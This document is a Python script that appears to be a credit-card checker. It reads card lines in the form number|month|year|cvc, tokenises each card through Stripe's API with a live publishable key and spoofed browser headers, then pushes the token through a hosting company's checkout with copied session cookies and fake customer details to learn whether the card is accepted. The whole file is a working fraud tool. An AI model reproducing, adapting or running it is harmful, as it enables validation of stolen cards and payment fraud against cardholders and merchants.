import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=aea898cc-f95b-425e-83ca-8d0b1a5eca914dc543&muid=dcb91b61-ed7c-4487-9b9b-dc147602151538c6d4&sid=067ccf98-61c1-44c3-ab06-c7a3c0c1d5d76e57a4&payment_user_agent=stripe.js%2F37f75041a7%3B+stripe-js-v3%2F37f75041a7%3B+split-card-element&time_on_page=57976&key=pk_live_51K9x9oLI1SL4EGpUbktL84zF7JsJyzmVYeARDaWoHAhSOObtNBeBRtvNBRL8MJQFgrQ7QmYnFiQRDijzNGuiUkaN00xQybd4DF'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return '#'
	import requests
	
	cookies = {
	    '_gcl_aw': 'GCL.1691036857.CjwKCAjw_aemBhBLEiwAT98FMiN-EmqZGxm0JP1KBzO6uBEj4qHT6HVnmbmc3cOptxswoYrfBDdrIxoCv1oQAvD_BwE',
	    '_gcl_au': '1.1.1174716848.1691036857',
	    '_ga': 'GA1.1.1220772932.1691036857',
	    'WHMCSakgme2xxDWj4': '94489293e706aaaf5c43bf21d4b9102f',
	    '__stripe_mid': 'dcb91b61-ed7c-4487-9b9b-dc147602151538c6d4',
	    '__stripe_sid': '067ccf98-61c1-44c3-ab06-c7a3c0c1d5d76e57a4',
	    '_ga_92WVCLVGV9': 'GS1.1.1691036857.1.1.1691036950.0.0.0',
	}
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '_gcl_aw=GCL.1691036857.CjwKCAjw_aemBhBLEiwAT98FMiN-EmqZGxm0JP1KBzO6uBEj4qHT6HVnmbmc3cOptxswoYrfBDdrIxoCv1oQAvD_BwE; _gcl_au=1.1.1174716848.1691036857; _ga=GA1.1.1220772932.1691036857; WHMCSakgme2xxDWj4=94489293e706aaaf5c43bf21d4b9102f; __stripe_mid=dcb91b61-ed7c-4487-9b9b-dc147602151538c6d4; __stripe_sid=067ccf98-61c1-44c3-ab06-c7a3c0c1d5d76e57a4; _ga_92WVCLVGV9=GS1.1.1691036857.1.1.1691036950.0.0.0',
	    'Origin': 'https://clients.asurahosting.com',
	    'Referer': 'https://clients.asurahosting.com/cart.php?a=checkout',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = f'token=9704cc35e2fb5a858fb2a6810efe0857c90fd38c&submit=true&loginemail=&loginpassword=&custtype=new&firstname=hhfh&lastname=hhfhmhhfhmdkdk&email=dhjd%40gmail.com&country-calling-code-phonenumber=1&phonenumber=&companyname=&address1=dhhd&address2=gdg&city=hshs&state=&postcode=&country=US&password=0)%40R*t%2B%40K%25mD&password2=0)%40R*t%2B%40K%25mD&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&payment_method_id={id}'
	
	response = requests.post(
	    'https://clients.asurahosting.com/index.php?rp=/stripe/payment/intent',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	).json()
	try:
		ii=response['validation_feedback']
	except:
		return 'success'
	return ii